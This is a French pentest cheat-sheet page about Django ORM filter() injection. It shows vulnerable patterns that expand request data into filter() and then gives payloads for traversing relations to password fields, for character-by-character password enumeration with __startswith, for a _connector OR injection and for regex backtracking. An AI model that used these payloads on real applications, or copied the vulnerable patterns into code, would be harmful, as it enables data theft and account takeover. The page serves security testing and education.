---
title: "Injection filter() Django : abus de lookup et expansion de dictionnaire des données de requête"
description: Étendre des dictionnaires contrôlés par l'attaquant dans QuerySet.filter()/exclude() et faire confiance aux lookups de champ fournis par l'utilisateur expose des colonnes imprévues et de la logique booléenne.
keywords:
  - ORM Django
  - injection filter()
  - injection de lookup
  - expansion de QueryDict
  - exclude()
  - injection de logique booléenne
---

# Injection filter()

Contrairement à `raw()`/`extra()`, `filter()` paramètre les **valeurs**, donc l'injection SQL classique par évasion de chaîne ne s'applique pas côté valeur. La classe de vulnérabilité ici est l'**abus de lookup et de champ** : lorsque le code applicatif laisse la requête contrôler *quel champ* ou *quel lookup* est interrogé, ou étend un dictionnaire contrôlé par l'attaquant directement dans `filter(**data)`, l'attaquant atteint des champs et de la logique booléenne que le développeur n'avait jamais prévu d'exposer.

## Schémas vulnérables

**Expansion de dictionnaire des données de requête :**

```python
# data = request.GET.dict() or parsed JSON
User.objects.filter(**data)
```

**Nom de champ/lookup contrôlé par l'utilisateur :**

```python
field = request.GET["field"]          # e.g. "email"
User.objects.filter(**{f"{field}__icontains": term})
```

## Exploitation

**Traversée relationnelle vers d'autres tables.** Les lookups Django suivent `__` à travers les clés étrangères, donc un nom de champ contrôlable atteint les modèles liés :

```
field = profile__user__password        # traverse into a related sensitive column
field = groups__permissions__codename
```

**L'échange de lookup** change la sémantique de comparaison, `__gt`, `__startswith`, `__regex`, `__isnull`, transformant une vérification d'égalité en oracle d'énumération :

```
?username__startswith=admin
?password__startswith=a            # confirm char-by-char via response differences
?is_superuser__isnull=false
```

**Injection de logique booléenne via `_connector`.** Lorsqu'un dict est étendu dans un helper construisant un `Q`, injecter des clés de connecteur bascule AND en OR :

```json
{"username": "admin", "_connector": "OR", "is_superuser": "True"}
```

**Élargissement massif du filtre** (`exclude(**data)` / `get(**data)`) peut être orienté pour renvoyer ou agir sur des enregistrements hors du périmètre prévu, se combinant à des failles d'autorisation pour une prise de contrôle de compte ou une divulgation de données.

Les lookups `__regex` / `__iregex` exposent en outre le moteur d'expressions régulières du backend, qui peut être poussé vers un backtracking catastrophique.

## Outils

- **Burp Repeater** : échanger les lookups et les noms de champ pour traverser les relations et construire des oracles.
- **Burp Intruder** : automatiser l'énumération caractère par caractère via __startswith.

## Références

- [Documentation Django : Field lookups](https://docs.djangoproject.com/en/stable/ref/models/querysets/#field-lookups)
- [Documentation Django : Complex lookups with Q objects](https://docs.djangoproject.com/en/stable/topics/db/queries/#complex-lookups-with-q-objects)
- [PayloadsAllTheThings : SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
